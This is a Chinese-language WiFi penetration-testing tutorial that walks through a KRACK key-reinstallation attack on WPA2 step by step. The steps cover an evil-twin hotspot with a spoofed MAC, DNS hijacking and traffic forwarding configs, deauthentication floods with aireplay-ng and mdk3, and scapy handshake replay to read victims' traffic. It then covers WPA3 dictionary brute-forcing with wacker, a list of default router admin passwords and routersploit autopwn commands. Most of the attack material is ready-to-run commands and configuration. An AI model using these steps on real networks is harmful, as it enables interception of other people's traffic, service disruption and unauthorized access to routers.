# WiFi无线渗透测试

## 0x00 进行渗透时需知晓的基础知识

1. WPA2:是WPA的升级版，是针对保护无线网络安全而设计的无线网络保护系统，引入了PSK（预共享密钥模式）秘钥，加强了WPA的不足之处，但是因为使用了PSK，所以只要攻击者知晓目标的PSK秘钥，就能十分轻易加入无线网络。

2. WPA3:是近几年新出现的无线网络安全保护系统，在WPA2的基础上实现了针对字典法暴力密码破解的难度，如果失败次数过多，AP将直接锁定攻击行为，以及取代了PSK使用对等实体验证（SAE）

3. AP:特指无线网络接入点，就是路由器等设备的广泛称呼

PS.实现无线网络攻击一般都需要两张或更多网卡，有时候也需要一些社工手段！购买无线网卡强烈建议购买支持802.11ac协议的网卡！！！

## 0x01 WPA2渗透思路

如果实在嫌跑密码的进度过慢或者没有好的字典，可以试一试wpa2的秘钥重装攻击(KRACK)
PS.本文所用的方法绝大部分没有使用大佬提供的POC,旨为了能够完全细化并理解KRACK攻击的步骤

## 0x02 秘钥重装攻击复现步骤：

秘钥重装攻击（KRACK）：
此攻击针对WPA2协议中创建一个Nonce（一种共享密钥）的四次握手。

## 0x03 KRACK的原理：

WPA2的标准预期有偶尔发生的Wi-Fi断开连接，并允许使用同样的值重连第三次握手，以做到快速重连和连续性。因为标准不要求在此种重连时使用不同密钥，所以可能出现重放攻击。

攻击者还可以反复重发另一设备的第三次握手来重复操纵或重置WPA2的加密密钥。每次重置都会使用相同的值来加密数据，因此可以看到和匹配有相同数据的块，识别出被加密密钥链的数据块。随着反复的重置暴露越来越多的密钥链，最终整个密钥链将被获知，攻击者将可读取目标在此连接上的所有流量。

WPA2通常用于移动设备至固定接入点或家庭路由器的连接，尽管某些流量本身可能被SSL/TLS等协议加密，但风险仍十分严重。

1. 启动网卡的混杂模式

> sudo airmong-ng start <device1>

2. 对目标AP进行信息收集

> sudo airodump-ng <device1>

3. 找到目标AP的BSSID

4. 锁定目标BSSID后，使用

> sudo airodump-ng <device1> --bssid=<target bssid>

5. 嗅探该AP中的所有成员

6. 克隆Wi-Fi钓鱼热点

需要伪造一个同名，同mac地址的钓鱼热点
更改网卡mac地址步骤：

```
sudo ifconfig device2 down
sudo macchaner device2 -m <newmac> //注意，请将这里的newmac更改为目标AP点的mac地址
sudo ifconfig device2 up
```

伪造热点：
```bash
sudo airmong start wlan2 //开启网卡的监听模式
sudo airbase-ng -e <target SSID>  -c <channel> <device2> //讲trget SSID更改为目标SSID，并且channel更改成不同的信道
sudo ifconfig at0 up //启动虚拟网关
sudo vi /etc/network/interfaces
------------------------------
//配置虚拟网卡地址参数
auto at0
iface at0 inet static
address 192.168.199.1  //这里最好与目标ap点的管理页面一样
netmask 255.255.255.0
------------------------------
sudo service networking restart //重启网卡服务
ifconfig at0查看at0网卡，如果没有ip地址或者不存在，重试以上步骤,注意！必须先使用airbase-ng创建AP点,at0网卡才会被可用！
```


配置DHCP:
```
sudo vi /etc/dhcp/dhcpd.conf
设置子网 掩码 分配地址范围等
在里面添加：
subnet 192.168.199.0 netmask 255.255.255.0{
    range 192.168.199.100 192.168.199.150;
    option routers 192.168.199.1;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 192.168.178.99; //注意这里的doamin地址需要自己更换
}
```

进入下一配置文件，将at0指定为dhcp请求网卡
sudo vi /etc/default/isc-dhcp-server
将其中的INTERFACESv4=""更改为INTERFACESv4="at0"
sudo service isc-dhcp-server restart //重启dhcp服务

配置dnsmasq
```
sudo vi /etc/dnsmasq.conf
添加以下内容:
resolv-file=/etc/resolv.conf //设置resolv目录
strict-order
listen-address=192.168.199.113 //这个ip是本机ip，如果只想本地访问可以填写127.0.0.1

address=/baidu.com/192.168.178.99 //注意，这一步很重要，需要在这里设置泛解析
address=/111.com/220.181.38.148

server=8.8.8.8 
//设置谷歌dns为首选dns
server=114.114.114.114

sudo vi /etc/resolv.conf
添加nameserver为本机ip地址
```

重启dnsmasq服务
```
sudo service dnsmasq restart
```
设置iptables进行流量转发:
```
//使用iptables编写规则：

iptables -t nat -A POSTROUTING -s 192.168.199.0/24 -j SNAT --to 192.168.178.99

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
//对eth0进行源nat
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
//转发能上网的无线网卡流量
iptables -A FORWARD -p tcp --syn -s 192.168.199.0/24 -j TCPMSS --set-mss 1356
iptables-save //保存
```

sudo airbase-ng -e <target SSID>  -c <channel> <device2> //讲trget SSID更改为目标SSID，并且channel更改成不同的信道

7.但是我们也不能白等新的冤大头连上我们的热点，所以我们可以对目标AP的成员使用断网攻击使其强制掉线重连

aireplay-ng攻击：
```
//先对目标AP进行锁定监听并保存抓到的握手包
sudo airodump-ng <device1> --bssid=<target bssid> --channel=<channel> -w <文件保存路径>
//然后打开一个新的命令窗口进行攻击
sudo aireplay-ng -0 0 -a <target AP BSSID>  -c <target member MAC> <device1>
```

mdk3/mdk4攻击：
```
vi blacklist //创建一个黑名单文件，并且把目标的BSSID填进去
sudo mdk3 <device> d -s 1000 -b blacklist.txt -c <target channel> //执行攻击
//mdk4同理,只需要把mdk3换成mdk4
```
稍等一会后，所有目标均已离线，2.4gAP网络用户断网连接后一般来说都可以直接获取到握手包

8.获取四次握手的数据包
当左上角出现：
[WPA handshake: xxxxxx]

就说明我们拿到了握手包
接着打开wireshak,将上一步的01号数据包到wireshark打开搜索字符串Message
需要找到含有 【key】 的一条数据包，右键选择标记分组，到处特定分组，保存第三条握手包

9. 实行攻击

(1)使用scapy伪造含有CSA(信道切换公告)信标的beacon管理帧，使成员强制连接到钓鱼热点
CSA信息元素：
(2)向成员设备发送3号握手包多次，并允许1、2号握手包通过，阻断4号握手包使其强制安装秘钥

在此演示使用scapy发送三号握手包
```py
sudo scapy //打开scapy

a= rdpcap('key.pcap') # 刚才保存的pcap
send(a)
```
攻击完成，攻击者打开wireshark监听，可以发现成员在目标AP内浏览的所有TCP明文

秘钥归0POC项目链接:https://github.com/vanhoefm/krackattacks-poc-zerokey
KRACK攻击POC实例脚本地址:https://github.com/vanhoefm/krackattacks-scripts



---

## WPA3攻击思路

WPA3在线字典攻击工具----wacker

在使用工具前，我们需要先编译作者自改的wpa_supplicant
首先下载工具

```
git clone https://github.com/blunderbuss-wctf/wacker.git
cd wacker
apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev
cd wpa_supplicant-2.8/wpa_supplicant/
cp defconfig_brute_force .config
make -j4
ls -al wpa_supplicant
```

split.sh是用来为多个网卡进行分配破解工作而进行生成单次列表
使用：
```
sudo ./split.sh <份数> <单词列表>
```

wacker.py是程序本体
使用方法与选项：

```
--wordlist <wordlist> 指定使用的字典
--interface <interface> 指定使用的设备
--bssid <BSSID> 指定目标的BSSID
--ssid <SSID> WPA3的ssid
--freq <freq> AP的频率
--start <START_WORD> 从单词列表中的指定字符开始
--debug 输出debug信息
--wpa2 使用WPA2模式
```

## 路由器后台渗透思路

在进入无线局域网后，我们可以对无线路由器的后台进行渗透，渗透后台的方法包括但不限于：漏洞、跑包、弱密码，后台密码很大概率会与Wi-Fi密码相同
这里贴出一些常用路由器的默认后台账号密码：

```
TP_LINK家用路由器:admin-admin
TP_LINK企业级路由器:admin-admin123456或admin-123456admin
Tenda路由器：admin-admin
360路由器:admin-admin
华为路由器:admin-admin
Netcore路由器:guest-guest
小米：没密码
FAST路由器:admin-admin
D-Link路由器:admin-admin
PHICOMM路由器:admin-admin
```

- **routersploit项目地址:** https://github.com/threat9/routersploit.git

```bash
git clone https://github.com/threat9/routersploit.git
cd routersploit
pip3 install -r requirements.txt
```

routersploit的使用:

```bash
sudo ./rsf.py //开启routersplot
use scanners/autopwn //执行自动扫描模块
show option //查看设置

set target <路由器后台地址>
run //启动扫描

```

- **汇总各大路由器漏洞的网站:** http://routerpwn.com/




## 参考资料

- [干货 | WiFi无线渗透测试总结](https://mp.weixin.qq.com/s/I8PvHt5fFty1k8OogcNobw)
- [另一个总结（还没看）](https://mp.weixin.qq.com/s?__biz=Mzg3ODg1MDUxNw==&mid=2247483723&idx=1&sn=a6772e33c107f04ec4d8110540d7de0c&chksm=cf0c39f1f87bb0e799e561ffa496b6fc432794b79830fff31327044562bd5449796d63557d97&scene=132#wechat_redirect)